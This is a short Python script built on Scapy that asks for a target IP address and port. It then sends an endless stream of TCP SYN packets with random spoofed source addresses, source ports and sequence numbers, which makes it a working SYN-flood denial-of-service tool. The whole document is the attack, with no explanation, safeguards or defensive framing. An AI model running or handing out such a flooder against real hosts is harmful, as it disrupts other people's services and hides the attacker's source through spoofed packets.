from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

target = input("target ip:")
dport = input("dport value:")
ip = IP(dst=target)
tcp = TCP(dport=int(dport), flags='S')
pkt = ip/tcp

while True:
  pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
  pkt[TCP].sport = getrandbits(16) # source port
  pkt[TCP].seq = getrandbits(32) # sequence number
  send(pkt, verbose=0)
